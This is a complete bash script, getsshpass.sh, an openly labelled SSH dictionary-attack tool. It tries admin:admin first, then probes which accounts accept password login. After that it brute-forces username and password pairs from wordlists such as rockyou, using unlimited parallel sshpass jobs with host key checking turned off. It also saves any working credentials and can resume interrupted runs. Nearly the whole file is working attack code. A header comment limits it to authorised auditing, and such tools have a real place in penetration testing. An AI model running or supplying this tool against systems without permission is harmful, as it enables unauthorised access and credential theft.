#!/usr/bin/env bash
#
# getsshpass.sh - SSH dictionary attack tool for authorized security auditing.
# Use only on systems you own or have explicit written permission to test.
#
# Copyright (C) 2016-2026:
#
# - Radovan Brezula 'brezular'
# - Blai Peidro
#
# License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
# This is free software: you are free to change and redistribute it.
# There is NO WARRANTY, to the extent permitted by law.

# Fail a pipeline if any command in it fails, not just the last
set -o pipefail

##############################
# Constants and globals
##############################

readonly VERSION="1.0"                                  # edit on every release
readonly SCRIPT_DIR="$(cd "$(dirname "${0}")" && pwd)"  # script absolute path
readonly STATE_BASE="${SCRIPT_DIR}/.getsshpass"         # per-host subdirs

declare STATE_DIR=""          # per-host state subdirectory path
declare RESULT_FILE=""        # path to result.txt (found credentials)
declare RESUME_FILE=""        # path to resume.txt (last attempted pair)
declare FILTERED_USERLIST=""  # path to filtered_users.txt (users with password)

declare port="22"         # target SSH port
declare delay="0.04"      # delay between attempts in seconds
declare max_jobs="0"      # max parallel SSH jobs; 0 = unlimited
declare max_retries="50"  # max retries per attempt on SSH errors (3, 255)
declare ssh_timeout="8"   # SSH connection timeout in seconds

declare host=""            # target SSH hostname or IP
declare clear_state=""     # set by --clear flag
declare list_wordlists=""  # set by --list flag
declare userlist=""        # active username file (trimmed on resume)
declare userlist_orig=""   # original username file path (for .new cleanup)
declare passlist=""        # active password file (trimmed on resume)
declare passlist_orig=""   # original password file path (for .new cleanup)
declare fullpasslist=""    # full password file path (for total count)
declare fulluserlist=""    # full username file path (for total count)

declare -a CHILD_PIDS=()      # child PIDs for cleanup
declare -a download_names=()  # wordlists to fetch (-f/--fetch)

declare -i attempt=0         # running attempt counter
declare -i total_attempts=0  # total combinations to try

##############################
# Terminal colors and logging
##############################

# Enable colors only when stdout is a terminal (not piped/redirected)
if [[ -t 1 ]]; then
  readonly RED='\033[0;31m'
  readonly GREEN='\033[0;32m'
  readonly YELLOW='\033[1;33m'
  readonly CYAN='\033[0;36m'
  readonly BOLD='\033[1m'
  readonly RESET='\033[0m'
else
  readonly RED='' GREEN='' YELLOW='' CYAN='' BOLD='' RESET=''
fi

# Logging functions - all user-facing output goes through these.
# %(%Y-%m-%d %H:%M:%S)T is bash 4.2+ builtin timestamp (-1 = now).
# %b expands ANSI escape sequences for colors.
msg_ok() {
  printf '%(%Y-%m-%d %H:%M:%S)T [%bOK   %b] %s\n' \
    -1 "${GREEN}" "${RESET}" "${*}"
}

msg_fail() {
  printf '%(%Y-%m-%d %H:%M:%S)T [%bERROR%b] %s\n' \
    -1 "${RED}" "${RESET}" "${*}" >&2
}

msg_warn() {
  printf '%(%Y-%m-%d %H:%M:%S)T [%bWARN %b] %s\n' \
    -1 "${YELLOW}" "${RESET}" "${*}" >&2
}

msg_info() {
  printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] %s\n' \
    -1 "${CYAN}" "${RESET}" "${*}"
}

##############################
# Usage and version
##############################

# Print usage information and available options.
usage() {
  cat <<EOF
Usage: $(basename "${0}") [OPTIONS]

OPTIONS:
   -a, --attack HOST      IP address or hostname of target SSH host
   -p, --port PORT        TCP port 1-65535 of target SSH host [default: 22]
   -u, --users FILE       Path to file with usernames
   -d, --dictionary FILE  Path to file with passwords
   -w, --wait SECS        Delay between attempts in seconds (e.g. 1, 0.1, 0.0) [default: 0.04]
   -j, --jobs JOBS        Maximum parallel SSH attempts, 0 = unlimited [default: 0]
   -r, --retries N        Max retries per attempt on transient SSH errors [default: 50]
   -t, --timeout SECS     SSH connection timeout in seconds [default: 8]
   -c, --clear            Clear all state files (results, resume, filtered users)
   -f, --fetch NAME       Download a wordlist (rockyou, 10k, 100k)
   -l, --list             List available wordlists
   -v, --version          Display version
   -h, --help             Display help

EXAMPLES:
   $(basename "${0}") -a 192.168.1.1 -p 22 -u users.txt -d rockyou.txt
   $(basename "${0}") -a server.local -u users.txt -d rockyou.txt -w 0.5 -j 3
   $(basename "${0}") --fetch rockyou
   $(basename "${0}") -f 10k
EOF
}

# Print version and license information.
version() {
  cat <<EOF
getsshpass ${VERSION}

Copyright (C) 2016-2026:

- Radovan Brezula 'brezular'
- Blai Peidro

License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
EOF
  exit 0
}

##############################
# State management
##############################

# Initialize per-host state directory paths.
init_state_dir() {
  STATE_DIR="${STATE_BASE}/${host}"
  RESULT_FILE="${STATE_DIR}/result.txt"
  RESUME_FILE="${STATE_DIR}/resume.txt"
  FILTERED_USERLIST="${STATE_DIR}/filtered_users.txt"
}

# Remove state files for a specific host or all hosts.
clear_state_files() {
  if [[ -n "${host}" ]]; then
    rm -rf "${STATE_BASE}/${host}"
    msg_ok "State files cleared for host '${host}'"
  else
    rm -rf "${STATE_BASE}"
    msg_ok "All state files cleared"
  fi
}

# Terminate all tracked child processes and remove temporary .new files.
cleanup() {
  for pid in "${CHILD_PIDS[@]}"; do
    kill "${pid}" 2>/dev/null
    wait "${pid}" 2>/dev/null
  done
  CHILD_PIDS=()

  # Remove .new temp files created by restore_progress (tail output)
  [[ -n "${userlist_orig}" && -f "${userlist_orig}.new" ]] \
    && rm -f "${userlist_orig}.new"
  [[ -n "${passlist_orig}" && -f "${passlist_orig}.new" ]] \
    && rm -f "${passlist_orig}.new"
}

##############################
# Wordlists
##############################

# Print available wordlists from the catalog file.
list_available_wordlists() {
  local catalog="${SCRIPT_DIR}/wordlists.txt"

  if [[ ! -f "${catalog}" ]]; then
    msg_fail "Wordlist catalog not found: '${catalog}'"
    exit 1
  fi

  msg_info "Available wordlists:"
  printf '\n'
  while IFS='|' read -r wl_name wl_file wl_desc wl_url; do
    [[ "${wl_name}" =~ ^#.*$ || -z "${wl_name}" ]] && continue
    printf "%-10s %s\n" "${wl_name}" "${wl_desc}"
  done < "${catalog}"
}

# Download a wordlist from the catalog file (wordlists.txt).
download_wordlist() {
  local catalog="${SCRIPT_DIR}/wordlists.txt"

  if [[ ! -f "${catalog}" ]]; then
    msg_fail "Wordlist catalog not found: '${catalog}'"
    exit 1
  fi

  if ! command -v curl &>/dev/null; then
    msg_fail \
      "Utility 'curl' not found. Install it with your package manager."
    exit 1
  fi

  local name="${1}"
  local found=0

  while IFS='|' read -r wl_name wl_file wl_desc wl_url; do
    wl_url="${wl_url%$'\r'}"
    [[ "${wl_name}" =~ ^#.*$ || -z "${wl_name}" ]] && continue
    if [[ "${name}" == "${wl_name}" ]]; then
      found=1
      if [[ -f "${wl_file}" ]]; then
        msg_warn "File '${wl_file}' already exists, skipping"
        return
      fi
      msg_info "Downloading '${wl_file}' (${wl_desc})..."
      if curl -fSL --progress-bar -o "${wl_file}" "${wl_url}"; then
        local lines
        lines="$(grep -c '' "${wl_file}")"
        # Cursor up + carriage return + clear line:
        # overwrites curl's progress bar
        printf '\033[A\r\033[K'
        msg_ok "Downloaded '${wl_file}'" \
          "($(format_number "${lines}") lines)"
      else
        printf '\033[A\r\033[K'
        msg_fail "Failed to download '${wl_file}'"
        rm -f "${wl_file}"
        return 1
      fi
      break
    fi
  done < "${catalog}"

  if [[ ${found} -eq 0 ]]; then
    msg_fail "Unknown wordlist: '${name}'"
    list_available_wordlists
    return 1
  fi
}

##############################
# Helpers
##############################

# Format a number with thousand separators (e.g. 1234567 -> 1,234,567).
# Pure bash, no subprocesses.
format_number() {
  local n="${1}" i len result=""
  len=${#n}
  for (( i=0; i<len; i++ )); do
    (( i > 0 && (len - i) % 3 == 0 )) && result+=","
    result+="${n:i:1}"
  done
  printf '%s' "${result}"
}

##############################
# Progress bar and time tracking
##############################

# Bottom progress bar (apt-style). Uses terminal scroll region to pin a bar
# at the last row while normal output scrolls above it.
declare -i PB_ROWS=0
declare -i PB_COLS=0
declare PB_FMT_TOTAL=""
declare -i PB_BAR_WIDTH=0

progress_bar_setup() {
  PB_ROWS="$(tput lines 2>/dev/null)"
  PB_COLS="$(tput cols 2>/dev/null)"
  (( PB_ROWS > 1 && PB_COLS > 0 )) || return
  PB_FMT_TOTAL="$(format_number "${total_attempts}")"
  local max_label="${PB_FMT_TOTAL}/${PB_FMT_TOTAL}"
  PB_BAR_WIDTH=$(( PB_COLS - 10 - ${#max_label} ))
  (( PB_BAR_WIDTH < 10 )) && PB_BAR_WIDTH=10
  # Save cursor, set scroll region to rows 1..(last-1), restore cursor.
  # This reserves the bottom row for the progress bar while
  # normal output scrolls above it without overwriting the bar.
  printf '\033[s\033[1;%dr\033[u' "$(( PB_ROWS - 1 ))"
}

progress_bar_draw() {
  # \r = carriage return, \033[K = clear to end of line,
  # \033[?7l = disable line wrap (prevents spillover on long lines)
  printf '\r\033[K\033[?7l'
  printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] ' \
    -1 "${CYAN}" "${RESET}"
  printf \
    'Trying user: '\''%b%s%b'\'' password: '\''%b%s%b'\''' \
    "${CYAN}" "${1}" "${RESET}" \
    "${YELLOW}" "${2}" "${RESET}"
  printf '\033[?7h'
}

progress_bar_update() {
  local current="${1}" total="${2}"
  local pct filled empty label fmt_current fill_str empty_str
  if (( total > 0 )); then
    pct=$(( current * 100 / total ))
  else
    pct=0
  fi
  local n="${current}" i len
  fmt_current=""; len=${#n}
  for (( i=0; i<len; i++ )); do
    (( i > 0 && (len - i) % 3 == 0 )) && fmt_current+=","
    fmt_current+="${n:i:1}"
  done
  label="${fmt_current}/${PB_FMT_TOTAL}"
  filled=$(( pct * PB_BAR_WIDTH / 100 ))
  empty=$(( PB_BAR_WIDTH - filled ))
  # printf -v assigns to a variable without forking a subshell
  printf -v fill_str '%*s' "${filled}" ''
  printf -v empty_str '%*s' "${empty}" ''
  # ${fill_str// /█} replaces each space with a block char.
  # Sequence: save cursor, jump to bottom row, clear line,
  # disable wrap, draw bar, re-enable wrap, restore cursor.
  printf '\033[s\033[%d;0H\033[K\033[?7l[%b%s%b] %3d%% | %s\033[?7h\033[u' \
    "${PB_ROWS}" "${GREEN}" "${fill_str// /█}${empty_str}" \
    "${RESET}" "${pct}" "${label}"
}

progress_bar_clear() {
  local rows
  rows="$(tput lines 2>/dev/null)"
  (( rows > 0 )) || return
  # Save cursor, jump to bottom row, clear it,
  # reset scroll region to full terminal, restore cursor.
  printf '\033[s\033[%d;0H\033[K\033[1;%dr\033[u' \
    "${rows}" "${rows}"
}

elapsed_time() {
  local dt=${SECONDS}
  local dd=$(( dt / 86400 ))
  local dh=$(( (dt % 86400) / 3600 ))
  local dm=$(( (dt % 3600) / 60 ))
  local ds=$(( dt % 60 ))

  local result=""
  (( dd > 0 )) && result+="${dd}d "
  (( dh > 0 )) && result+="${dh}h "
  (( dm > 0 )) && result+="${dm}m "
  result+="${ds}s"

  msg_info "Elapsed time: ${result}"
}

##############################
# Argument parsing and validation
##############################

# Parse command-line arguments.
read_args() {
  if [[ ${#} -eq 0 ]]; then
    usage
    exit 0
  fi

  while [[ ${#} -gt 0 ]]; do
    case "${1}" in
      -a|--attack)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        host="${2}"
        shift 2
        ;;
      -p|--port)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        port="${2}"
        shift 2
        ;;
      -u|--users)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        userlist="${2}"
        userlist_orig="${userlist}"
        shift 2
        ;;
      -d|--dictionary)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        passlist="${2}"
        passlist_orig="${passlist}"
        shift 2
        ;;
      -w|--wait)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        delay="${2}"
        shift 2
        ;;
      -j|--jobs)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        max_jobs="${2}"
        shift 2
        ;;
      -r|--retries)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        max_retries="${2}"
        shift 2
        ;;
      -t|--timeout)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        ssh_timeout="${2}"
        shift 2
        ;;
      -c|--clear)
        clear_state=1
        shift
        ;;
      -f|--fetch)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        download_names+=("${2}")
        shift 2
        ;;
      -l|--list)
        list_wordlists=1
        shift
        ;;
      -v|--version)
        version
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        msg_fail "Unknown option: ${1}"
        usage
        exit 1
        ;;
      *)
        msg_fail "Unexpected argument: ${1}"
        usage
        exit 1
        ;;
    esac
  done
}

# Validate the target host as an IPv4 address or hostname.
validate_host() {
  if [[ -z "${host}" ]]; then
    msg_fail "Host address cannot be empty"
    usage
    exit 1
  fi

  local ip_regex='^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'
  if [[ "${host}" =~ ${ip_regex} ]]; then
    IFS='.' read -r -a octets <<< "${host}"
    for octet in "${octets[@]}"; do
      # 10# forces decimal - without it, 08/09 fail as invalid octal
      if (( 10#${octet} > 255 )); then
        msg_fail "'${host}' is not a valid IP address" \
          "(octet ${octet} > 255)"
        exit 1
      fi
    done
  else
    local host_regex='^[a-zA-Z0-9]'
    host_regex+='([a-zA-Z0-9\-]*[a-zA-Z0-9])?'
    host_regex+='(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$'
    if [[ ! "${host}" =~ ${host_regex} ]]; then
      msg_fail \
        "'${host}' is not a valid IP address or hostname"
      usage
      exit 1
    fi
  fi
}

# Validate TCP port is a number in range 1-65535.
validate_port() {
  if [[ -z "${port}" ]] \
      || [[ ! "${port}" =~ ^[1-9][0-9]*$ ]] \
      || (( port > 65535 )); then
    msg_fail "TCP port must be a number in range 1-65535"
    usage
    exit 1
  fi
}

# Validate all arguments, check dependencies, and initialize state.
check_args() {
  if [[ -n "${list_wordlists}" ]]; then
    list_available_wordlists
    exit 0
  fi

  if [[ ${#download_names[@]} -gt 0 ]]; then
    local dl_failed=0
    for wl_name in "${download_names[@]}"; do
      download_wordlist "${wl_name}" || dl_failed=1
    done
    exit "${dl_failed}"
  fi

  if [[ -n "${clear_state}" ]]; then
    [[ -n "${host}" ]] && validate_host
    clear_state_files
    exit 0
  fi

  if ! command -v sshpass &>/dev/null; then
    msg_fail "Utility 'sshpass' not found." \
      "Install it with your package manager."
    exit 1
  fi

  validate_host
  validate_port

  if [[ ! "${max_jobs}" =~ ^(0|[1-9][0-9]*)$ ]]; then
    msg_fail "Maximum parallel jobs (-j/--jobs)" \
      "must be 0 (unlimited) or a positive integer"
    exit 1
  fi

  if [[ ! "${max_retries}" =~ ^[1-9][0-9]*$ ]]; then
    msg_fail \
      "Max retries (-r/--retries) must be a positive integer"
    exit 1
  fi

  if [[ ! "${ssh_timeout}" =~ ^[1-9][0-9]*$ ]]; then
    msg_fail \
      "SSH timeout (-t/--timeout) must be a positive integer"
    exit 1
  fi

  if [[ ! "${delay}" =~ ^[0-9]*\.?[0-9]+$ ]]; then
    msg_fail \
      "Delay (-w/--wait) must be a non-negative number"
    exit 1
  fi

  init_state_dir

  if [[ -f "${RESULT_FILE}" ]]; then
    local saved_user saved_pass
    saved_user="$(sed -n \
      "s/.*username: '\\([^']*\\)'.*/\\1/p" "${RESULT_FILE}")"
    saved_pass="$(sed -n \
      "s/.*password: '\\(.*\\)'/\\1/p" "${RESULT_FILE}")"
    msg_warn "Previous result found for '${host}':" \
      "user '${saved_user}', password '${saved_pass}'"
    printf "Run again anyway? [y/N] "
    read -r answer
    if [[ "${answer}" =~ ^[Yy]$ ]]; then
      clear_state_files
      init_state_dir
    else
      exit 0
    fi
  fi

  if [[ ! -f "${passlist}" ]]; then
    msg_fail \
      "Cannot find password file: '${passlist:-<not specified>}'"
    usage
    exit 1
  fi

  if [[ ! -f "${userlist}" ]]; then
    msg_fail \
      "Cannot find username file: '${userlist:-<not specified>}'"
    usage
    exit 1
  fi

  if [[ ! -r "${passlist}" ]]; then
    msg_fail "Cannot read password file: '${passlist}'"
    exit 1
  fi

  if [[ ! -r "${userlist}" ]]; then
    msg_fail "Cannot read username file: '${userlist}'"
    exit 1
  fi

  if [[ ! -s "${passlist}" ]]; then
    msg_fail "Password file is empty: '${passlist}'"
    exit 1
  fi

  if [[ ! -s "${userlist}" ]]; then
    msg_fail "Username file is empty: '${userlist}'"
    exit 1
  fi

  mkdir -p "${STATE_DIR}" || {
    msg_fail \
      "Cannot create state directory: '${STATE_DIR}'"
    exit 1
  }

  fullpasslist="${passlist}"
  fulluserlist="${userlist}"
}

##############################
# SSH operations
##############################

# Quick-win credential test with admin:admin and SSH reachability check.
check_ssh_connection() {
  msg_info "Checking SSH connection to '${host}:${port}'..."

  sshpass -p admin ssh \
    -o StrictHostKeyChecking=no \
    -o PubkeyAuthentication=no \
    -o ConnectTimeout="${ssh_timeout}" \
    -p "${port}" "admin@${host}" exit &>/dev/null
  local rvalssh=${?}

  if [[ "${rvalssh}" -eq 0 ]]; then
    msg_ok "Connection successful"
    printf '%s\n' \
      "Found username: 'admin' and password: 'admin'" \
      > "${RESULT_FILE}"
    evaluate_result
  elif [[ "${rvalssh}" -eq 255 ]]; then
    msg_fail \
      "Cannot establish SSH connection to '${host}:${port}'"
    exit 1
  else
    msg_ok "Connection successful"
  fi
}

# Probe usernames with ssh BatchMode to detect password auth.
filter_users_by_password_auth() {
  if [[ -s "${FILTERED_USERLIST}" ]]; then
    local cached_count
    cached_count="$(grep -c '' "${FILTERED_USERLIST}")"
    msg_info "Found cached user filter list" \
      "(${cached_count} users with password authentication)"
    printf "Reuse cached list? [Y/n] "
    read -r answer
    if [[ ! "${answer}" =~ ^[Nn]$ ]]; then
      userlist="${FILTERED_USERLIST}"
      userlist_orig="${FILTERED_USERLIST}"
      fulluserlist="${FILTERED_USERLIST}"
      return
    fi
  fi

  msg_info \
    "Filtering users with password authentication enabled..."

  > "${FILTERED_USERLIST}"  # truncate file to start fresh
  local total_users
  total_users="$(grep -c '' "${userlist}")"
  local -a filter_pids=()
  local filter_tmp="${STATE_DIR}/filter_tmp"
  rm -rf "${filter_tmp}"
  mkdir -p "${filter_tmp}"

  # Each user is probed in a parallel subshell. Subshells write
  # a marker file to filter_tmp/<user> if password auth is enabled.
  # We collect results after all probes finish, re-reading the
  # userlist to rebuild filtered_users.txt in original order.
  while IFS= read -r user || [[ -n "${user}" ]]; do
    user="${user%$'\r'}"
    [[ -z "${user}" ]] && continue
    (
      local status
      status="$(ssh \
        -o BatchMode=yes \
        -o StrictHostKeyChecking=no \
        -o PubkeyAuthentication=no \
        -o ConnectTimeout="${ssh_timeout}" \
        -p "${port}" "${user}@${host}" echo ok 2>&1)"
      if [[ "${status}" =~ password|keyboard-interactive ]]; then
        local safe_user="${user//\//%2F}"
        printf '%s\n' "${user}" > "${filter_tmp}/${safe_user}"
      fi
    ) &
    filter_pids+=("${!}")
    CHILD_PIDS+=("${!}")
  done < "${userlist}"
  for pid in "${filter_pids[@]}"; do
    wait "${pid}" 2>/dev/null
  done
  CHILD_PIDS=()

  # Rebuild filtered list preserving original order
  while IFS= read -r user || [[ -n "${user}" ]]; do
    user="${user%$'\r'}"
    [[ -z "${user}" ]] && continue
    local safe_user="${user//\//%2F}"
    [[ -f "${filter_tmp}/${safe_user}" ]] \
      && printf '%s\n' "${user}" >> "${FILTERED_USERLIST}"
  done < "${userlist}"
  rm -rf "${filter_tmp}"

  local filtered_count
  if [[ -s "${FILTERED_USERLIST}" ]]; then
    filtered_count="$(grep -c '' "${FILTERED_USERLIST}")"
  else
    filtered_count=0
  fi

  if [[ ${filtered_count} -eq 0 ]]; then
    msg_warn \
      "No users with password authentication enabled found"
    exit 0
  fi

  msg_info \
    "Found ${filtered_count}/${total_users} users with password authentication enabled"
  userlist="${FILTERED_USERLIST}"
  userlist_orig="${FILTERED_USERLIST}"
  fulluserlist="${FILTERED_USERLIST}"
}

# Restore progress from a previous interrupted run.
restore_progress() {
  if [[ -f "${RESUME_FILE}" ]]; then
    local resume_line lastuser lastpass
    IFS= read -r resume_line < "${RESUME_FILE}"
    lastuser="${resume_line%%$'\t'*}"
    lastpass="${resume_line#*$'\t'}"

    if [[ "${resume_line}" != *$'\t'* \
        || -z "${lastuser}" || -z "${lastpass}" ]]; then
      msg_warn \
        "Resume file is corrupted, starting from beginning"
      rm -f "${RESUME_FILE}"
    else
      msg_info \
        "Found resume file with username: '${lastuser}'" \
        "and password: '${lastpass}'"
      msg_info "Restoring progress..."

      local row1user rvaluser row1pass rvalpass
      # grep -F = literal match (no regex), -x = full line,
      # -n = print line number. sed strips \r first.
      row1user="$(sed 's/\r$//' "${userlist}" \
        | grep -Fxn -- "${lastuser}")"
      rvaluser=${?}
      row1pass="$(sed 's/\r$//' "${passlist}" \
        | grep -Fxn -- "${lastpass}")"
      rvalpass=${?}

      if [[ "${rvaluser}" -eq 0 ]]; then
        local rowuser="${row1user%%:*}"
        tail -n +"${rowuser}" "${userlist}" \
          > "${userlist}.new"
        userlist="${userlist}.new"
      else
        msg_warn \
          "User '${lastuser}' not found in user list," \
          "starting from beginning"
        rm -f "${RESUME_FILE}"
      fi

      if [[ "${rvaluser}" -eq 0 && "${rvalpass}" -eq 0 ]]; then
        local rowpass="${row1pass%%:*}"
        tail -n +"${rowpass}" "${passlist}" \
          > "${passlist}.new"
        passlist="${passlist}.new"
      elif [[ "${rvaluser}" -eq 0 && "${rvalpass}" -ne 0 ]]; then
        msg_warn \
          "Password '${lastpass}' not found in password list," \
          "starting passwords from beginning"
      fi
    fi
  fi

  local maxusercount maxpasscount
  local remaining_users remaining_passes
  maxusercount="$(grep -c '' "${fulluserlist}")"
  maxpasscount="$(grep -c '' "${fullpasslist}")"
  total_attempts=$(( maxusercount * maxpasscount ))
  remaining_users="$(grep -c '' "${userlist}")"
  remaining_passes="$(grep -c '' "${passlist}")"
  # Completed = total - remaining in current user's pass list
  #   - (remaining users after current) * full pass list size
  attempt=$(( total_attempts - remaining_passes \
    - (remaining_users - 1) * maxpasscount ))
  if (( attempt < 0 )); then attempt=0; fi
}

##############################
# Attack engine
##############################

# Attempt SSH login with a single username/password pair.
try_ssh() {
  local user="${1}"
  local pass="${2}"
  local retval=1
  local -i retries=0

  while true; do
    sshpass -p "${pass}" ssh \
      -o StrictHostKeyChecking=no \
      -o PubkeyAuthentication=no \
      -o ConnectTimeout="${ssh_timeout}" \
      -p "${port}" "${user}@${host}" exit &>/dev/null
    retval=${?}

    # sshpass: 0=success, 5=wrong password, 3=runtime error,
    # 255=SSH connection failure. Retry only on transient errors.
    [[ "${retval}" -ne 255 && "${retval}" -ne 3 ]] && break

    # Another job already found the password - stop retrying
    [[ -f "${RESULT_FILE}" ]] && return
    if (( retries >= max_retries )); then
      msg_warn \
        "Max retries (${max_retries}) reached" \
        "for user '${user}', password '${pass}'"
      return
    fi
    ((retries++))
    sleep "${delay}"
  done

  if [[ "${retval}" -eq 0 ]]; then
    printf '%s\n' \
      "Found username: '${user}' and password: '${pass}'" \
      > "${RESULT_FILE}"
  fi
}

# Remove finished PIDs from CHILD_PIDS.
prune_finished_pids() {
  local active=()
  for pid in "${CHILD_PIDS[@]}"; do
    if kill -0 "${pid}" 2>/dev/null; then
      active+=("${pid}")
    fi
  done
  CHILD_PIDS=("${active[@]}")
}

# Block until a background job slot is available.
wait_for_job_slot() {
  (( max_jobs == 0 )) && return
  while (( $(jobs -rp | wc -l) >= max_jobs )); do
    sleep 0.05
  done
}

# Main attack loop.
launch_attack() {
  local maxusercount maxpasscount
  maxusercount="$(grep -c '' "${fulluserlist}")"
  maxpasscount="$(grep -c '' "${fullpasslist}")"
  local jobs_label
  if (( max_jobs == 0 )); then
    jobs_label="unlimited"
  else
    jobs_label="max ${max_jobs}"
  fi
  # Reset bash builtin timer so elapsed_time() measures attack only
  SECONDS=0
  msg_info "Starting attack against ${host}:${port}" \
    "(${jobs_label} parallel jobs, ${delay}s delay)"
  msg_info \
    "Users to try: $(format_number "${maxusercount}")"
  msg_info \
    "Passwords to try: $(format_number "${maxpasscount}")"
  msg_info \
    "Total combinations: $(format_number "${total_attempts}")"

  if [[ -t 1 ]]; then
    progress_bar_setup
    progress_bar_update "${attempt}" "${total_attempts}"
  fi

  # || [[ -n ]] handles files missing a trailing newline
  # ${var%$'\r'} strips Windows carriage return (\r\n -> \n)
  while IFS= read -r user || [[ -n "${user}" ]]; do
    user="${user%$'\r'}"
    [[ -z "${user}" ]] && continue
    while IFS= read -r pass || [[ -n "${pass}" ]]; do
      pass="${pass%$'\r'}"
      [[ -z "${pass}" ]] && continue

      if [[ -f "${RESULT_FILE}" ]]; then
        evaluate_result
      fi

      ((attempt++))
      if [[ -t 1 ]]; then
        progress_bar_draw "${user}" "${pass}"
        progress_bar_update "${attempt}" "${total_attempts}"
      else
        local fmt_att="" fmt_tot="" n i len
        n="${attempt}"; len=${#n}
        for (( i=0; i<len; i++ )); do
          (( i > 0 && (len - i) % 3 == 0 )) \
            && fmt_att+=","
          fmt_att+="${n:i:1}"
        done
        n="${total_attempts}"; len=${#n}
        for (( i=0; i<len; i++ )); do
          (( i > 0 && (len - i) % 3 == 0 )) \
            && fmt_tot+=","
          fmt_tot+="${n:i:1}"
        done
        printf \
          '[%s/%s] Trying user: '\''%s'\'' password: '\''%s'\''\n' \
          "${fmt_att}" "${fmt_tot}" "${user}" "${pass}"
      fi

      printf '%s\t%s\n' "${user}" "${pass}" > "${RESUME_FILE}"

      wait_for_job_slot
      # </dev/null prevents background job from stealing the
      # wordlist file descriptor that the outer read loop uses
      try_ssh "${user}" "${pass}" </dev/null &
      CHILD_PIDS+=("${!}")
      (( attempt % 100 == 0 )) && prune_finished_pids

      sleep "${delay}"
    done < "${passlist}"
    # Reset to full password list for the next username
    passlist="${fullpasslist}"
  done < "${userlist}"

  # Wait for all background try_ssh jobs before checking results
  wait

  evaluate_result
}

# Check if a password was found and display results.
evaluate_result() {
  cleanup
  [[ -t 1 ]] && progress_bar_clear

  if [[ -f "${RESULT_FILE}" ]]; then
    printf \
      '\r\033[K%(%Y-%m-%d %H:%M:%S)T [%bOK   %b] %b%s%b\n' \
      -1 "${GREEN}" "${RESET}" \
      "${GREEN}${BOLD}" "$(<"${RESULT_FILE}")" "${RESET}"
    elapsed_time
    rm -f "${RESUME_FILE}"
    exit 0
  else
    printf '\r\033[K'
    msg_warn "Password not found. Try a different dictionary."
    elapsed_time
    rm -f "${RESUME_FILE}"
    exit 1
  fi
}

##############################
# Signal handling
##############################

# Handle termination signals with clean shutdown.
handle_signal() {
  local msg="${1}" code="${2}"
  [[ -t 1 ]] && progress_bar_clear
  if [[ -n "${msg}" ]]; then
    echo
    msg_warn "${msg}"
  fi
  cleanup
  exit "${code}"
}

# Redraw progress bar on terminal resize.
handle_winch() {
  if [[ -t 1 && ${PB_ROWS} -gt 0 ]]; then
    progress_bar_clear
    progress_bar_setup
    (( PB_ROWS > 0 )) && progress_bar_update "${attempt}" "${total_attempts}"
  fi
}

# Register signal handlers for clean shutdown.
setup_signal_handlers() {
  trap 'handle_signal "Interrupted. Run the script again to resume." 130' INT
  trap 'handle_signal "Stopped. Run the script again to resume." 148' TSTP
  trap 'handle_signal "" 129' HUP
  trap 'handle_signal "" 143' TERM
  trap 'handle_signal "" 131' QUIT
  trap 'handle_winch' WINCH
}

##############################
# Main execution flow
##############################

main() {
  read_args "${@}"                # 1. Parse command-line flags
  check_args                      # 2. Validate inputs and dependencies
  setup_signal_handlers           # 3. Set traps for clean shutdown
  check_ssh_connection            # 4. Test SSH connectivity
  filter_users_by_password_auth   # 5. Filter users with password auth
  restore_progress                # 6. Resume from last attempt
  launch_attack                   # 7. Run the dictionary attack
}

main "${@}"
